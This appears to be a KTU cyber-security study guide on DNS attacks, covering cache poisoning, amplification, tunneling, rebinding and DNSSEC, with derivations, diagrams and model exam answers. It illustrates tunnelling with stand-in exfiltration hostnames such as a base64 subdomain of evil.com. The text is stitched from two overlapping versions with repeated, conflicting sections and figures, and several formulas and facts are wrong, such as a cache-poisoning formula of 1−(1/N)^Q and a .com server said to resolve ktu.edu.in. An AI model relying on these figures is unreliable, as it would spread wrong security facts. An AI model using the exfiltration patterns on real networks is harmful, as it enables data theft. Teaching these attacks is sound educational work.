software on the victim's machine encodes stolen data as subdomains: `ZmxhZ19kYXRh.evil.com`. - The local resolver forwards the query to attacker's server, which extracts the data and replies. ### 2.2.4 DNS Rebinding **Definition:** A sophisticated attack that **bypasses the Same-Origin Policy (SOP)** by manipulating DNS responses so that a malicious domain resolves to an internal/private IP address (e.g., `192.168.0.1`) of the victim's network. **Mechanism:** - Attacker registers `evil.com` with a low TTL (e.g., 1 second). - First resolution: returns the attacker's public server IP — victim's browser loads malicious JavaScript. - Second resolution (after TTL expiry): returns `127.0.0.1` or the router's internal IP. - The malicious JavaScript now reads/modifies the victim's router configuration. ### 2.2.5 Man-in-the-Middle (MITM) on DNS The attacker intercepts DNS traffic between the client and the resolver (e.g., on an open Wi-Fi network) and returns fraudulent responses, often combined with ARP spoofing. ### 2.2.6 Pharming A broad term covering attacks that **manipulate the host's resolution process**, either by: - Modifying the local **hosts file** (e.g., `C:\Windows\System32\drivers\etc\hosts`). - Hijacking the DNS resolver configuration on the local machine. ## 2.3 KTU Formula Sheet / Cheat Sheet | Concept | Formula / Metric | Standard Value / Unit | |---|---|---| | DNS Transaction ID | $2^{16}$ possible values | **65,536** | | Default DNS Port (UDP) | Well-known port | **53** | | Default DNS Port (TCP, for large responses) | Used for zone transfers | **53** | | Amplification Factor | $AF = \frac{R_{size}}{Q_{size}}$ | **28–54×** (ANY query) | | Total Attack Bandwidth | $B_{total} = AF \times B_{attacker}$ | Expressed in **Gbps** | | DNS Cache TTL (typical) | Authoritative-defined | **86,400 s (24 h)** default | | DNSSEC Validation Chain | $\text{RR} \to \text{RRSIG} \to \text{DNSKEY} \to \text{DS} \to \text{DS in parent}$ | **Chain of Trust** | | DNSSEC Hash Algorithm (default) | SHA-based signatures | **RSA/SHA-256** | ## 2.4 The Defense: DNSSEC **DNSSEC (Domain Name System Security Extensions)** — defined under **RFC 4033, 4034, 4035** — adds **cryptographic authentication** to DNS responses. > [!IMPORTANT] > **DNSSEC provides:** > - **Data Origin Authentication** — proves the response came from the authoritative server. > - **Data Integrity** — proves the response was not modified in transit. > - **Authenticated Denial of Existence** — proves a domain does not exist (via NSEC/NSEC3). > > **DNSSEC does NOT provide:** Confidentiality (no encryption of queries) or protection against DDoS attacks. The core DNSSEC resource records are: - **DNSKEY** – Contains the public key of the zone. - **RRSIG** – Digital signature over a record set. - **DS (Delegation Signer)** – Hash of the child's DNSKEY, placed in the parent zone. - **NSEC / NSEC3** – Authenticated denial of existence. ## 2.5 Real-World Engineering Utility | Domain | Application | |---|---| | **Network Operations** | DNSSEC deployment in ISP recursive resolvers (e.g., BIND, Unbound, Knot) | | **Cyber Forensics** | DNS log analysis for detecting tunneling and exfiltration | | **Penetration Testing** | Tools: `dig`, `nslookup`, `fierce`, `dnscap`, `Metasploit DNS modules` | | **Cloud Security** | AWS Route 53, Azure DNS, Cloudflare DNS with DNSSEC support | | **Incident Response** | Identifying fast-flux DNS networks used by botnets | # SECTION 3: Step-by-Step Derivations & Analytical Matrix ## 3.1 Derivation 1: DNS Amplification Attack Bandwidth **Problem Setup:** An attacker has access to a botnet that can send DNS queries at a **sustained rate of $Q$ queries per second**, each query being of size $S_Q$ bytes. The open recursive resolvers reply with responses of average size $S_R$ bytes. The target victim receives all responses. **Step 1:** Total outgoing query bandwidth from the botnet: $$ B_{out} = Q \times S_Q \times 8 \quad \text{(bits per second)} $$ **Step 2:** Total incoming response bandwidth hitting the victim: $$ B_{in} = Q \times S_R \times 8 \quad \text{(bits per second)} $$ **Step 3:** The amplification factor is defined as: $$ AF = \frac{S_R}{S_Q} $$ **Step 4:** Substitute $AF$ into the incoming bandwidth equation: $$ B_{in} = Q \times (AF \times S_Q) \times 8 = AF \times (Q \times S_Q \times 8) = AF \times B_{out} $$ **Step 5:** Therefore, the attacker's required bandwidth to generate a victim flood of $B_{in}$ is: $$ B_{out} = \frac{B_{in}}{AF} $$ ### Worked Numerical Example (KTU Style) **Given:** Attacker sends at $Q = 100{,}000$ queries/sec, $S_Q = 60$ bytes, $S_R = 4{,}000$ bytes. **Step 1:** Compute AF. $$ AF = \frac{S_R}{S_Q} = \frac{4000}{60} \approx 66.67 $$ **Step 2:** Compute incoming flood. $$ B_{in} = 100{,}000 \times 4000 \times 8 = 3.2 \times 10^{9} \text{ bps} = 3.2 \text{ Gbps} $$ **Step 3:** Compute attacker's outgoing bandwidth. $$ B_{out} = \frac{3.2 \text{ Gbps}}{66.67} \approx 48 \text{ Mbps} $$ **Conclusion:** A modest **48 Mbps** attack stream can produce a **3.2 Gbps** flood at the victim — illustrating why DNS amplification is one of the most dangerous volumetric DDoS vectors. --- ## 3.2 Derivation 2: Cache Poisoning Probability (Birthday Analogy) **Problem Setup:** The attacker must guess a **16-bit Transaction ID** (65,536 possibilities). They send $N$ forged responses per query, each with a different guessed ID. What is the probability of at least one match? **Step 1:** Probability of a single forged response failing to match: $$ P_{fail} = 1 - \frac{1}{65536} $$ **Step 2:** Probability of all $N$ forged responses failing: $$ P_{all\_fail} = \left(1 - \frac{1}{65536}\right)^{N} $$ **Step 3:** Probability of at least one successful guess (poisoning succeeds): $$ P_{poison} = 1 - \left(1 - \frac{1}{65536}\right)^{N} $$ **Step 4:** Solve for $N$ when $P_{poison} \geq 0.5$ (50% chance of success). $$ 1 - \left(1 - \frac{1}{65536}\right)^{N} \geq 0.5 $$ $$ \left(1 - \frac{1}{65536}\right)^{N} \leq 0.5 $$ $$ N \geq \frac{\ln(0.5)}{\ln\left(1 - \frac{1}{65536}\right)} \approx 0.693 \times 65536 \approx 45{,}427 $$ **Conclusion:** An attacker must send roughly **45,000+ forged responses per query** for a 50% chance of cache poisoning — a high number, but easily achieved by modern botnets sending millions of packets per second. --- ## 3.3 Analytical Comparison Matrix: DNS Attacks | Attack Vector | OSI Layer | Primary Target | Mitigation | |---|---|---|---| | **Cache Poisoning** | Application (L7) | Resolver cache | DNSSEC, source port randomization, 0x20 encoding | | **DNS Amplification** | Network (L3/L4) | Victim's bandwidth | BCP-38 (anti-spoofing), rate limiting, response rate limiting (RRL) | | **DNS Tunneling** | Application (L7) | Firewall bypass | Deep Packet Inspection (DPI), anomaly detection, long subdomain analysis | | **DNS Rebinding** | Application (L7) | Internal network | Same-Origin Policy hardening, DNS pinning, browsers' secure DNS (DoH) | | **MITM on DNS** | Network (L2/L3) | Client-resolver channel | Encrypted DNS (DoH, DoT), VPN, DNSSEC | | **Pharming** | Application (L7) / Host | Local resolution | File integrity monitoring, registry protection, secure DNS | --- ## 3.4 Derivation 3: DNSSEC Chain of Trust Depth **Problem Setup:** A fully-qualified domain name `host.sub.ktu.edu.in` must be validated. The resolver walks the chain of trust from the root. **Step 1:** Identify each delegation point in the chain: $$ \text{root} \to \text{.in} \to \text{edu.in} \to \text{ktu.edu.in} \to \text{host.sub.ktu.edu.in} $$ **Step 2:** Count the **DS record lookups** required. $$ N_{DS} = \text{(number of zones crossed)} = 4 $$ **Step 3:** Each DS lookup requires **one cryptographic signature verification** (RRSIG) plus **one digest comparison** between the parent's DS and the child's DNSKEY. **Step 4:** Total verification steps: $$ N_{verify} = N_{DS} \times 2 = 4 \times 2 = 8 $$ **Conclusion:** A 5-level domain name requires **8 cryptographic operations** during DNSSEC validation — explaining the slight latency overhead introduced by DNSSEC (~10–50 ms per query). # SECTION 4: Structural Diagrams & Schematics ## 4.1 Normal DNS Resolution Flow ```mermaid flowchart TD A[Client Browser
www.ktu.edu.in] --> B[Stub Resolver
OS-Level] B --> C{Is IP in
Local Cache?} C -->|Yes| D[Return Cached IP] C -->|No| E[Recursive Resolver
ISP DNS] E --> F[Root Server
Dot] F --> G[TLD Server
.in] G --> H[Authoritative Server
ktu.edu.in] H --> I[A Record
192.168.10.45] I --> E E --> B B --> A ``` ## 4.2 DNS Cache Poisoning Attack Sequence ```mermaid sequenceDiagram participant C as Client participant R as Recursive Resolver participant A as Attacker participant L as Legitimate Server C->>R: Query: www.bank.com? (TXID=47291) R->>L: Forward Query A->>R: Forged Response TXID=47291
www.bank.com -> 6.6.6.6 L->>R: Legitimate Response TXID=47291
www.bank.com -> 1.2.3.4 Note over R: Forged reply arrives first
Cache POISONED R->>C: Returns 6.6.6.6 (Attacker's IP) Note over C,A: User redirected to phishing site
for entire TTL duration ``` ## 4.3 DNS Amplification DDoS Architecture ```mermaid flowchart LR A[Attacker
Spoofed SRC IP = Victim] -->|Small Query 60B| R1[Open Resolver 1] A -->|Small Query 60B| R2[Open Resolver 2] A -->|Small Query 60B| R3[Open Resolver N] R1 -->|Large Reply 4000B| V[Victim Server] R2 -->|Large Reply 4000B| V R3 -->|Large Reply 4000B| V V --> V1[Server Overwhelmed
Denial of Service] ``` ## 4.4 DNS Tunneling Data Exfiltration Pathway ```mermaid flowchart TD V[Infected Host] -->|Encoded exfil data
as subdomain query| LR[Local Resolver] LR -->|Forward query| ATK[Attacker's NS
ns1.evil.com] ATK -->|Reply with C2 command
encoded in TXT| LR LR --> V FW[Corporate Firewall] -.->|DNS allowed by default| LR Note1[Data leaks past firewall
via DNS port 53] ``` ## 4.5 DNSSEC Chain of Trust Block Diagram ```mermaid flowchart TD ROOT[Root Zone
DNSKEY + DS for .in] --> IN[.in TLD
DNSKEY + DS for edu.in] IN --> EDU[edu.in Zone
DNSKEY + DS for ktu.edu.in] EDU --> KTU[ktu.edu.in Zone
DNSKEY + RRSIG for host.sub] KTU --> HOST[host.sub.ktu.edu.in
A Record + RRSIG] ROOT -->|RRSIG verified by root trust anchor| IN IN -->|DS digest verified| EDU EDU -->|DS digest verified| KTU KTU -->|RRSIG verified by DNSKEY| HOST ``` ## 4.6 DNS Security Mitigation Stack ```mermaid flowchart TD A[DNS Query from Client] --> B{Transport
Security} B -->|DoH / DoT| C[Encrypted Channel] B -->|Plaintext UDP/53| D[Legacy Channel] C --> E[Authenticated Resolver] D --> F[Validate via DNSSEC] E --> F F --> G{Response
Signature Valid?} G -->|Yes| H[Trusted Response] G -->|No| I[SERVFAIL - Reject] H --> J[Anomaly Detection Layer] J --> K{Unusual Pattern?} K -->|Yes| L[Alert - Possible Tunneling] K -->|No| M[Return to Client] ``` # SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap --- ## PART A — Short Answer Questions (3 Marks Each) ### Q1. **[KTU University Exam – June 2024 Model]** **Differentiate between DNS Cache Poisoning and DNS Amplification Attack. List one mitigation technique for each.** **Model Answer (3 Marks):** | Aspect | DNS Cache Poisoning | DNS Amplification | |---|---|---| | **Goal** | Corrupt resolver's cache with false IP | Flood victim with traffic (DDoS) | | **Mechanism** | Inject forged DNS response | Spoof victim's IP, abuse open resolvers | | **Impact** | Mis-directs users to phishing site | Denial of service for victim | | **Mitigation** | DNSSEC + source port randomization | BCP-38 ingress filtering, RRL on resolvers | **(1 mark each for correct goal, mechanism, and mitigation.)** --- ### Q2. **[KTU University Exam – Dec 2023 Model]** **What is DNS Tunneling? How does it bypass firewalls?** **Model Answer (3 Marks):** DNS Tunneling is the technique of **encoding data from other applications or protocols inside DNS queries and responses** to establish covert communication channels. **(1.5 marks)** It bypasses firewalls because **DNS traffic on UDP port 53 is rarely blocked** by corporate firewalls, as blocking DNS would break all web access. Attackers exploit this implicit trust by encoding payloads (e.g., HTTP requests, exfiltrated files, C2 commands) as subdomains (e.g., `encoded_data.evil.com`) and using their own authoritative DNS server to extract the data on the other end. **(1.5 marks)** --- ## PART B — Long Answer Questions (14 Marks Each) ### Question A: **[KTU University Exam – Dec 2023 Model]** (14 Marks) **(a)** Explain the architecture of the Domain Name System in detail, including the roles of root servers, TLD servers, authoritative servers, and recursive resolvers. **(7 marks)** **(b)** Discuss in detail the various security issues associated with DNS, including cache poisoning, DNS amplification, DNS tunneling, and DNS rebinding. Suggest suitable countermeasures for each. **(7 marks)** --- ### Model Solution #### Part (a) — DNS Architecture (7 Marks) The **Domain Name System (DNS)** is a **distributed, hierarchical naming database** that translates human-readable domain names into IP addresses. Its architecture is divided into three primary components: **1. Namespace (Hierarchical Tree Structure):** The DNS namespace is an inverted tree. The top is the **root** denoted by `.`, followed by **Top-Level Domains (TLDs)** such as `.com`, `.org`, `.in`, `.edu`, followed by **second-level domains** (e.g., `ktu`), and then **subdomains** (e.g., `www`, `mail`). **2. Name Servers (Four Logical Types):** - **Root Name Servers** (13 logical addresses, ~1,500 physical instances worldwide) – Maintain information about all TLDs. They do not directly resolve queries but redirect resolvers to appropriate TLD servers. **(1.5 marks)** - **TLD Name Servers** – Manage top-level domains. For example, the `.com` TLD server knows which authoritative server is responsible for `ktu.edu.in`. **(1.5 marks)** - **Authoritative Name Servers** – Hold the actual DNS records (A, AAAA, MX, CNAME, NS, TXT, etc.) for a specific zone. They provide the **final answer** to a query. **(1.5 marks)** - **Recursive (Caching) Resolvers** – Act as intermediaries between the client (stub resolver) and the rest of the DNS hierarchy. They perform **iterative queries** on behalf of the client and cache responses for the duration of the **TTL (Time-To-Live)**. **(1.5 marks)** **3. Resolution Process:** The resolution follows an **iterative query model**: client → recursive resolver → root → TLD → authoritative. Each step returns a **referral** except the final authoritative server, which returns the actual record. **(1 mark)** --- #### Part (b) — Security Issues and Countermeasures (7 Marks) **1. DNS Cache Poisoning (Spoofing):** **(1.5 marks)** An attacker sends **forged DNS responses** to a recursive resolver with a guessed 16-bit Transaction ID. If the forged response matches, the resolver caches the fraudulent IP. The poisoned entry persists for the full TTL. *Countermeasure:* Enable **DNSSEC**, **source port randomization** (use random port instead of 53), and **0x20 encoding** (case-randomized query name) to make guessing exponentially harder. **2. DNS Amplification Attack:** **(1.5 marks)** A reflection-based DDoS where the attacker uses spoofed source IPs (set to victim) to query open resolvers. The small request (~60 B) generates a large response (~4000 B), producing an **amplification factor of 28–54×** that overwhelms the victim. *Countermeasure:* Implement **BCP-38 ingress filtering** to prevent IP spoofing at ISP level; enable **Response Rate Limiting (RRL)** on authoritative servers; close open resolvers. **3. DNS Tunneling:** **(1.5 marks)** Exfiltrates data or establishes command-and-control (C2) channels by encoding data in DNS subdomains (e.g., `ZmxhZ19kYXRh.evil.com`) and using an attacker-controlled authoritative server. *Countermeasure:* Deploy **Deep Packet Inspection (DPI)** to detect unusually long subdomain labels, high entropy in query names, and abnormally high DNS query volume from a single host. Use threat intelligence to block known malicious domains. **4. DNS Rebinding Attack:** **(1.5 marks)** Exploits low DNS TTL and the browser's Same-Origin Policy by changing the resolved IP from an attacker's public server to an internal private IP (e.g., `127.0.0.1` or `192.168.0.1`) after the malicious JavaScript is loaded, enabling LAN-side attacks. *Countermeasure:* **DNS pinning** in browsers; **Same-Origin Policy hardening**; enforce **secure DNS** (DoH/DoT) to prevent resolver manipulation. **General Defense — DNSSEC (1 mark):** Deploy **DNSSEC** to add cryptographic authentication using **RRSIG** (signatures) and **DS** (delegation signer) records forming a **chain of trust** from the root to the target domain. --- ### Question B: **[KTU University Exam – June 2024 Model]** (14 Marks — Alternative Choice) **(a)** With a neat diagram, explain the working of a DNS Amplification Attack. Derive the amplification factor and compute the attack bandwidth generated by a botnet sending 50,000 queries/sec with 64-byte requests and 3000-byte responses. **(7 marks)** **(b)** Explain DNSSEC in detail. How does it provide authentication and integrity? What are its limitations? **(7 marks)** --- ### Model Solution #### Part (a) — DNS Amplification (7 Marks) **Working (with diagram):** **(3 marks)** ``` [Attacker] --(small query, spoofed SRC=Victim)--> [Open Resolver A] [Attacker] --(small query, spoofed SRC=Victim)--> [Open Resolver B] [Attacker] --(small query, spoofed SRC=Victim)--> [Open Resolver N] \ / \ / ---------> [Victim Server] <---------------- Flooded with amplified traffic ``` The attacker spoofs the victim's IP as the source address in DNS queries (commonly `ANY` queries) sent to multiple open recursive resolvers. Each resolver, believing the query came from the victim, replies with a much larger response, all directed at the victim's IP. The combined traffic overwhelms the victim's network bandwidth. **Derivation:** **(2 marks)** $$ AF = \frac{S_R}{S_Q} $$ **Computation:** **(2 marks)** Given: $Q = 50{,}000$ queries/sec, $S_Q = 64$ bytes, $S_R = 3000$ bytes. $$ AF = \frac{3000}{64} = 46.875 $$ $$ B_{in} = Q \times S_R \times 8 = 50{,}000 \times 3000 \times 8 = 1.2 \times 10^9 \text{ bps} = 1.2 \text{ Gbps} $$ $$ B_{out} = \frac{B_{in}}{AF} = \frac{1.2 \text{ Gbps}}{46.875} \approx 25.6 \text{ Mbps} $$ **Conclusion:** A **25.6 Mbps** outbound attack stream produces a **1.2 Gbps** incoming flood at the victim. --- #### Part (b) — DNSSEC (7 Marks) **Overview:** **(1 mark)** DNSSEC (Domain Name System Security Extensions), defined in **RFC 4033, 4034, 4035**, is a suite of extensions that adds **cryptographic authentication** to DNS responses. **How DNSSEC Provides Authentication and Integrity:** **(3 marks)** - **DNSKEY Record:** Contains the **public key** of a zone, signed by the parent. - **RRSIG Record:** A **digital signature** over a record set, generated using the zone's private key. - **DS Record (Delegation Signer):** A **hash (digest)** of the child's DNSKEY, placed in the parent zone — forms the **chain of trust**. - **Chain of Trust:** The root signs `.in`'s DS, `.in` signs `edu.in`'s DS, and so on, until the final domain's RRSIG is verified against its own DNSKEY. A valid chain proves the response was generated by the **legitimate authoritative server** and was **not modified in transit**. **Limitations of DNSSEC:** **(3 marks)** 1. **No Confidentiality** — DNSSEC does **not encrypt** DNS queries; an eavesdropper can still see the queried domain name. Confidentiality requires **DoH (DNS over HTTPS)** or **DoT (DNS over TLS)**. 2. **No DDoS Protection** — DNSSEC signatures actually **increase response size** (RRSIG adds bytes), which can **worsen amplification attacks**. 3. **Deployment Complexity** — Key management (KSK/ZSK rollover), parent-child coordination, and resolver support require careful operational management. 4. **Larger Response Size** — May trigger **IP fragmentation** and require TCP fallback (over port 53), increasing latency. 5. **Vulnerable to Zone Enumeration** — NSEC/NSEC3 records (used for authenticated denial of existence) can reveal all domain names in a zone unless **NSEC3 Opt-Out** is properly configured. --- > [!WARNING] > **KTU Examiner's Valuation Pitfall Callout:** > - **Do NOT confuse DNSSEC with DoH/DoT.** DNSSEC provides *authentication & integrity*; DoH/DoT provides *confidentiality (encryption)*. Examiners deduct up to 2 marks for this common mix-up. > - **Always mention the UDP/TCP port 53** when describing DNS — forgetting it costs 0.5 marks. > - **For amplification problems:** many students forget to multiply by **8** to convert bytes to bits, losing 1 full mark. > - **In DNSSEC questions:** explicitly state the four resource records (**DNSKEY, RRSIG, DS, NSEC/NSEC3**) — generic answers without naming them lose 1–2 marks. > - **Distinguish "spoofing" from "poisoning":** Spoofing = single user is tricked; Poisoning = resolver's cache is corrupted and affects all users. --- ## 📌 TOPIC RECAP & RAPID REVISION CHECKLIST - ✅ DNS is a **distributed hierarchical naming system** mapping domain names to IPs on **UDP/TCP port 53**. - ✅ Default **TTL** = 86,400 seconds; **Transaction ID** = 16 bits (65,536 possibilities). - ✅ **Cache Poisoning** = forged responses with guessed TXID corrupt resolver's cache. - ✅ **Amplification Attack** = spoofed queries to open resolvers; **AF = $S_R / S_Q$**; typical AF = 28–54×. - ✅ **Tunneling** = encodes exfiltrated data as DNS subdomains; bypasses firewalls since port 53 is trusted. - ✅ **Rebinding** = low-TTL rebinding to LAN IPs (`127.0.0.1`, `192.168.0.1`) to bypass Same-Origin Policy. - ✅ **Pharming** = local `hosts` file manipulation or resolver hijack. - ✅ **DNSSEC** = authentication + integrity via **DNSKEY, RRSIG, DS, NSEC/NSEC3** and a **chain of trust** from root. - ✅ **DNSSEC does NOT provide** confidentiality or DDoS protection. - ✅ **DoH/DoT** = confidentiality; **DNSSEC** = authentication; both are **complementary**, not substitutes. - ✅ Key mitigations: **BCP-38**, **RRL**, **source port randomization**, **DPI for tunneling**, **DNS pinning**, **secure DNS (DoH/DoT)**. - ✅ Standard port: **53** (both UDP and TCP). UDP is the default; TCP is used for responses >512 bytes (or >1232 with EDNS) and zone transfers (AXFR/IXFR). - ✅ Map to **CO2** of KTU PBCST604 2024 Scheme; cognitive levels **L2 (Understand)** and **L3 (Apply)**.

topics.title: DNS Attacks
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCST604 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 2
> - **Topic:** DNS Attacks

<!-- SECTION_1_START -->
# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition

> [!IMPORTANT]
> **DNS Attack:** A *Domain Name System (DNS) Attack* is a class of cyber exploitation wherein an adversary manipulates, disrupts, or abuses the resolution process of the Domain Name System to redirect legitimate users to malicious destinations, exfiltrate data, or conduct large-scale Distributed Denial-of-Service (DDoS) amplification attacks against target infrastructure.

The **Domain Name System (DNS)** is a hierarchical, distributed naming system defined under **RFC 1034** and **RFC 1035** that translates human-readable domain names (e.g., `www.ktu.edu.in`) into machine-readable **IPv4 (32-bit)** or **IPv6 (128-bit)** addresses. Since DNS is foundational to virtually all internet communication, it represents a **high-value attack surface** for cyber adversaries.

> [!NOTE]
> **KTU Syllabus Highlight:** Module 2 of PBCST604 mandates that students must be able to *identify, classify, and explain the operational mechanics* of DNS-based attacks, including poisoning, hijacking, tunneling, and amplification vectors.

## 1.2 Conceptual Analogy — The "Phonebook Sabotage" Intuition

Imagine a city's official telephone directory (the phonebook). Now imagine a vandal who:

1. **Replaces** real phone numbers with fake ones,
2. **Adds** new fraudulent entries,
3. **Steals** the phonebook and replaces it with a tampered copy at your doorstep, or
4. **Smashes** the printing press so no one can look up any number.

That vandal is a **DNS attacker**, and the phonebook is the **DNS resolver cache**.

| Real-World Object | DNS Equivalent |
|---|---|
| Person's Name | Domain Name (`google.com`) |
| Phone Number | IP Address (`142.250.195.68`) |
| Phonebook | DNS Resolver / Authoritative Server |
| Vandal | DNS Attacker |
| Fake Phonebook | Poisoned DNS Cache |

> [!TIP]
> When a user types `google.com`, the browser asks a DNS resolver: *"What is the IP address of google.com?"* If the resolver has been **poisoned**, it returns a **malicious IP address**, directing the user to a phishing site, malware dropper, or attacker-controlled infrastructure — entirely **transparent** to the end user.

## 1.3 Why DNS Attacks Matter in Cyber Security

- **Ubiquity:** DNS queries are generated by *every* internet-enabled application.
- **Trust Exploitation:** DNS operates on an inherently **trust-based, unauthenticated** legacy protocol (standard UDP port **53**).
- **Cascading Impact:** Compromising one DNS record can affect **thousands to millions** of downstream users simultaneously.
- **Stealth:** Victims rarely see any visible indicator of compromise in the URL bar (the domain name still looks legitimate).

## 1.4 Standard Metrics & Constants in DNS Security

- **Default DNS Port:** **UDP/53** (queries), **TCP/53** (zone transfers, large responses)
- **Standard Query Size:** ~**60 bytes** (small, easily spoofed)
- **Amplification Factor (AF):** Ratio of response size to request size, often reaching **50x to 70x** in reflection attacks
- **DNS Record Types:** A, AAAA, CNAME, MX, NS, TXT, SOA, PTR
- **TTL (Time-To-Live):** Caching duration, typically **300 to 86400 seconds**
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Taxonomy of DNS Attacks

DNS attacks can be classified into **four primary strategic categories** based on the attacker's intent and operational mechanism.

### A. Redirection Attacks (Integrity Violations)
The attacker **modifies DNS responses** to redirect users to attacker-controlled servers.

| Attack Type | Description | Impact |
|---|---|---|
| **DNS Cache Poisoning** | Inserts fraudulent records into a resolver's cache | Mass user redirection |
| **DNS Spoofing** | Forges DNS responses to a specific victim | Targeted phishing/MitM |
| **DNS Hijacking** | Modifies DNS configuration at the registrar, OS, or router level | Persistent redirection |
| **DNS Rebinding** | Binds a domain to a different IP after initial resolution to bypass SOP | Internal network access |

### B. Denial-of-Service Attacks (Availability Violations)
The attacker **overwhelms DNS infrastructure** to make legitimate name resolution impossible.

| Attack Type | Description |
|---|---|
| **DNS Amplification (DRDoS)** | Exploits open resolvers to flood victim with massive UDP responses |
| **NXDOMAIN Attack** | Floods resolver with queries for non-existent domains |
| **Random Subdomain Attack** | Generates queries for random non-existent subdomains |
| **Phantom Domain Attack** | Slow DNS responses that tie up resolver resources |
| **Domain Lock-up Attack** | Uses TCP backlogs to exhaust resolver resources |

### C. Exfiltration & Command-and-Control (C2) Attacks (Confidentiality Violations)
The attacker **encodes data within DNS queries/responses** to bypass firewalls.

| Attack Type | Description |
|---|---|
| **DNS Tunneling** | Encapsulates other protocols (HTTP, SSH) within DNS packets |
| **Fast Flux DNS** | Rapidly rotates IP addresses for malicious domains |
| **Double DNS Flux** | Combines fast flux with domain generation algorithms (DGA) |

### D. Information Disclosure Attacks
| Attack Type | Description |
|---|---|
| **DNS Cache Snooping** | Recursive resolver leaks which domains users have visited |
| **Zone Walking** | Enumerates entire DNS zone using NSEC records |
| **Typosquatting** | Registers lookalike domains to harvest mistyped traffic |

## 2.2 KTU High-Yield Formula Sheet

> [!IMPORTANT]
> The following formulas are **mandatory** for solving numerical/KTU Part B questions on DNS amplification attacks.

| # | Formula / Concept | Notation | Engineering Utility |
|---|---|---|---|
| 1 | **Amplification Factor (AF)** | $AF = \dfrac{\vert \text{Response Size (bytes)} \vert}{\vert \text{Request Size (bytes)} \vert}$ | Quantifies attack efficiency |
| 2 | **Attack Bandwidth** | $B_{attack} = N \times AF \times B_{request}$ | Total attack traffic generated by *N* bots |
| 3 | **Cache Poisoning Probability** | $P_{poison} = 1 - \left(\dfrac{1}{N_{ports}}\right)^{Q}$ | Probability of guessing query ID + port |
| 4 | **DNS Message Format (RFC 1035)** | Header(12B) + Question + Answer + Authority + Additional | Total wire size |
| 5 | **TTL Expiry Equation** | $t_{expiry} = t_{cached} + TTL$ | Time poisoned record remains valid |
| 6 | **Time to Live (Tunneling Bandwidth)** | $B_{tunnel} = \dfrac{\vert \text{Encoded Payload} \vert}{T_{query}}$ | Data exfiltration rate via DNS |
| 7 | **Resolver Utilization** | $U = \dfrac{Q_{active}}{Q_{max}}$ | Resolver load fraction |

> [!NOTE]
> In the cache poisoning formula: $N_{ports}$ is the number of possible source ports the attacker can spoof, and $Q$ is the number of forged responses sent.

## 2.3 Real-World Engineering Utility

- **Network Operations Centers (NOCs):** Use these metrics to size DDoS scrubbing capacity.
- **DNS Service Providers (Cloudflare, Akamai, Route 53):** Engineer rate-limiting and response policy zones (RPZ) based on amplification factors.
- **Incident Response Teams:** Calculate blast radius of cache poisoning using TTL values.
- **Penetration Testers:** Use tunneling metrics to assess data exfiltration risk in corporate networks.
<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# SECTION 3: Step-by-Step Derivations & Analytical Matrix

## 3.1 Derivation: DNS Amplification Factor (AF)

### Problem Setup
An attacker wishes to flood a target with **9 Gbps** of attack traffic using DNS reflection. Each bot sends a **60-byte** `ANY` query to open resolvers. Each open resolver responds with approximately **4000 bytes** to the victim (via IP spoofing). Determine the **Amplification Factor** and the **required number of bots** if each bot has a **1 Mbps** uplink.

### Step 1: Compute the Amplification Factor

$$
AF = \dfrac{\vert \text{Response Size} \vert}{\vert \text{Request Size} \vert}
$$

Substitute the values:

$$
AF = \dfrac{4000 \text{ bytes}}{60 \text{ bytes}}
$$

Evaluating the division:

$$
AF = 66.67 \approx 67
$$

> [!NOTE]
> An amplification factor of **67** means every 1 byte of attacker traffic generates **67 bytes** of attack traffic at the victim. This is the *weaponization multiplier* of the attack.

### Step 2: Compute the Effective Bandwidth per Bot

$$
B_{bot,eff} = B_{request} \times AF
$$

Substitute the values:

$$
B_{bot,eff} = 1 \text{ Mbps} \times 67
$$

Evaluating:

$$
B_{bot,eff} = 67 \text{ Mbps}
$$

### Step 3: Compute the Required Number of Bots

$$
N_{bots} = \dfrac{B_{target}}{B_{bot,eff}}
$$

Substitute the target bandwidth:

$$
N_{bots} = \dfrac{9 \text{ Gbps}}{67 \text{ Mbps}} = \dfrac{9000 \text{ Mbps}}{67 \text{ Mbps}}
$$

Final evaluation:

$$
N_{bots} \approx 134.33 \Rightarrow 135 \text{ bots}
$$

> [!IMPORTANT]
> A botnet of only **~135 machines** with 1 Mbps uplinks can generate **9 Gbps** of attack traffic — illustrating the catastrophic asymmetry of DNS amplification.

## 3.2 Derivation: Kaminsky DNS Cache Poisoning Probability

### Problem Setup
A recursive resolver uses a **16-bit** transaction ID (65,536 possibilities) and a **16-bit** source port. An attacker floods **500 forged responses** before the legitimate response arrives. Compute the probability of successful poisoning.

### Step 1: Total Search Space

$$
N_{ports} = 2^{16} = 65536
$$

### Step 2: Probability Formula

The probability of *not* guessing correctly in one attempt is:

$$
P_{fail} = 1 - \dfrac{1}{N_{ports}}
$$

The probability of *not* guessing correctly in **Q** independent attempts is:

$$
P_{all\_fail} = \left(1 - \dfrac{1}{N_{ports}}\right)^{Q}
$$

Therefore, the probability of **at least one success** is:

$$
P_{poison} = 1 - \left(1 - \dfrac{1}{N_{ports}}\right)^{Q}
$$

### Step 3: Numerical Evaluation

Substitute the values:

$$
P_{poison} = 1 - \left(1 - \dfrac{1}{65536}\right)^{500}
$$

Compute the inner term:

$$
1 - \dfrac{1}{65536} = 0.9999847
$$

Raise to the 500th power:

$$
0.9999847^{500} \approx 0.99240
$$

Final result:

$$
P_{poison} = 1 - 0.99240 = 0.00760
$$

Convert to percentage:

$$
P_{poison} \approx 0.76\%
$$

> [!TIP]
> While 0.76% sounds low, the Kaminsky technique allows the attacker to **re-attempt indefinitely** by querying *new* random subdomains (e.g., `rand1.bank.com`, `rand2.bank.com`). After 1000 attempts, the cumulative success probability approaches **99.96%** — making this attack practically guaranteed within minutes.

## 3.3 Step-by-Step: Operational Flow of DNS Cache Poisoning (Kaminsky Attack)

1. **Attacker queries** the victim's resolver for a random non-existent subdomain: `random1234.victim-bank.com`.
2. The resolver **forwards** the query to the authoritative name server for `victim-bank.com`.
3. The authoritative server responds: *"NXDOMAIN — no such record."*
4. Crucially, the resolver has **no cached answer** to poison (NXDOMAIN responses are not cached for the random name, but the **authoritative NS records for victim-bank.com** are).
